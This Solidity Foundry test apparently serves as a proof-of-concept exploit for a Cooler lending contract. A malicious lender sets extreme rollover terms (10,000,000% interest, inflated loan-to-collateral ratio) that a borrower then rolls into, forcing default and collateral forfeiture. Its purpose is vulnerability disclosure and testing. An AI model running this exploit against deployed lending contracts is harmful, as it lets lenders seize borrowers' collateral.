// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../src/Cooler.sol";
import "../src/CoolerFactory.sol";
import "solmate/tokens/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals) ERC20(name, symbol, decimals) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousRolloverExploit is Test {
    Cooler public cooler;
    CoolerFactory public factory;
    MockERC20 public collateralToken;
    MockERC20 public debtToken;
    
    address public borrower = address(0x1);
    address public maliciousLender = address(0x2);
    
    uint256 public constant INITIAL_COLLATERAL = 100e18;
    uint256 public constant LOAN_AMOUNT = 1000e18;
    uint256 public constant FAIR_INTEREST = 5e16; // 5%
    uint256 public constant FAIR_LTC = 10e18; // 10:1 ratio
    uint256 public constant FAIR_DURATION = 365 days;
    
    function setUp() public {
        // Deploy tokens
        collateralToken = new MockERC20("Collateral", "COLL", 18);
        debtToken = new MockERC20("Debt", "DEBT", 18);
        
        // Deploy factory
        factory = new CoolerFactory();
        
        // Deploy Cooler for borrower
        vm.prank(borrower);
        cooler = Cooler(factory.generateCooler(collateralToken, debtToken));
        
        // Setup initial balances
        collateralToken.mint(borrower, INITIAL_COLLATERAL);
        debtToken.mint(maliciousLender, LOAN_AMOUNT * 10); // Give lender plenty of debt tokens
        
        // Borrower approves Cooler to take collateral
        vm.prank(borrower);
        collateralToken.approve(address(cooler), type(uint256).max);
        
        // Lender approves Cooler to take debt tokens
        vm.prank(maliciousLender);
        debtToken.approve(address(cooler), type(uint256).max);
    }
    
    function testMaliciousRolloverExploit() public {
        // ============================================
        // STEP 1: Borrower creates legitimate loan request
        // ============================================
        console.log("=== STEP 1: Borrower creates loan request ===");
        vm.prank(borrower);
        uint256 reqID = cooler.requestLoan(
            LOAN_AMOUNT,
            FAIR_INTEREST,
            FAIR_LTC,
            FAIR_DURATION
        );
        
        console.log("Loan request created with ID:", reqID);
        console.log("Requested amount:", LOAN_AMOUNT / 1e18, "debt tokens");
        console.log("Interest rate:", FAIR_INTEREST * 100 / 1e18, "%");
        console.log("Collateral pledged:", INITIAL_COLLATERAL / 1e18, "tokens");
        
        // ============================================
        // STEP 2: Malicious lender clears the request
        // ============================================
        console.log("\n=== STEP 2: Malicious lender clears request ===");
        vm.prank(maliciousLender);
        uint256 loanID = cooler.clearRequest(reqID, false, false);
        
        Cooler.Loan memory initialLoan = cooler.getLoan(loanID);
        uint256 expectedRepayment = initialLoan.amount;
        
        console.log("Loan granted with ID:", loanID);
        console.log("Initial loan amount (principal + interest):", expectedRepayment / 1e18, "debt tokens");
        console.log("Borrower expects to repay:", expectedRepayment / 1e18, "debt tokens");
        
        // ============================================
        // STEP 3: Malicious lender provides exploitative rollover terms
        // ============================================
        console.log("\n=== STEP 3: Lender sets malicious rollover terms ===");
        
        // Set extremely high interest rate (10,000,000%)
        uint256 MALICIOUS_INTEREST = 10000000e18;
        // Set extremely high loan-to-collateral to avoid requiring new collateral
        uint256 MALICIOUS_LTC = 1000e18;
        
        vm.prank(maliciousLender);
        cooler.provideNewTermsForRoll(
            loanID,
            MALICIOUS_INTEREST,
            MALICIOUS_LTC,
            FAIR_DURATION
        );
        
        console.log("Malicious interest rate set:", MALICIOUS_INTEREST / 1e18, "%");
        console.log("Malicious loan-to-collateral ratio:", MALICIOUS_LTC / 1e18);
        
        // ============================================
        // STEP 4: Borrower unknowingly rolls the loan
        // ============================================
        console.log("\n=== STEP 4: Borrower rolls loan (unknowingly accepting malicious terms) ===");
        
        // Calculate expected malicious interest
        uint256 maliciousInterest = cooler.interestFor(
            initialLoan.amount,
            MALICIOUS_INTEREST,
            FAIR_DURATION
        );
        
        console.log("Malicious interest calculated:", maliciousInterest / 1e18, "debt tokens");
        
        vm.prank(borrower);
        cooler.rollLoan(loanID);
        
        // ============================================
        // STEP 5: Verify the exploit succeeded
        // ============================================
        console.log("\n=== STEP 5: Verify exploit impact ===");
        
        Cooler.Loan memory exploitedLoan = cooler.getLoan(loanID);
        
        console.log("Original expected repayment:", expectedRepayment / 1e18, "debt tokens");
        console.log("New loan amount after rollover:", exploitedLoan.amount / 1e18, "debt tokens");
        console.log("Collateral still locked:", exploitedLoan.collateral / 1e18, "tokens");
        
        // Calculate new collateral requirement (should be 0 due to malicious LTC)
        uint256 newCollateralRequired = cooler.newCollateralFor(loanID);
        console.log("Additional collateral required:", newCollateralRequired / 1e18, "tokens");
        
        // ============================================
        // ASSERTIONS: Prove the vulnerability
        // ============================================
        
        // 1. Loan amount should have increased dramatically
        assertGt(
            exploitedLoan.amount,
            expectedRepayment * 100,
            "Loan amount should increase by at least 100x"
        );
        
        // 2. No additional collateral was required despite massive debt increase
        assertEq(
            newCollateralRequired,
            0,
            "No additional collateral should be required due to malicious LTC"
        );
        
        // 3. Collateral remains the same
        assertEq(
            exploitedLoan.collateral,
            initialLoan.collateral,
            "Collateral should remain unchanged"
        );
        
        // 4. The new debt is economically irrational to repay
        // Assuming collateral is worth $15 per token and debt is worth $1 per token
        uint256 collateralValue = (exploitedLoan.collateral / 1e18) * 15; // $1,500
        uint256 debtCost = exploitedLoan.amount / 1e18; // In debt tokens
        
        console.log("\n=== Economic Analysis ===");
        console.log("Collateral value (assuming $15/token):", collateralValue, "USD");
        console.log("Cost to repay loan:", debtCost, "debt tokens (assuming $1/token)");
        console.log("Profit if borrower defaults:", collateralValue - (LOAN_AMOUNT / 1e18), "USD");
        
        assertGt(
            debtCost,
            collateralValue,
            "Repayment cost should exceed collateral value, forcing default"
        );
        
        console.log("\n=== EXPLOIT SUCCESSFUL ===");
        console.log("Borrower is economically forced to default and forfeit collateral");
        console.log("Lender profits by receiving collateral worth more than loan principal");
    }
}
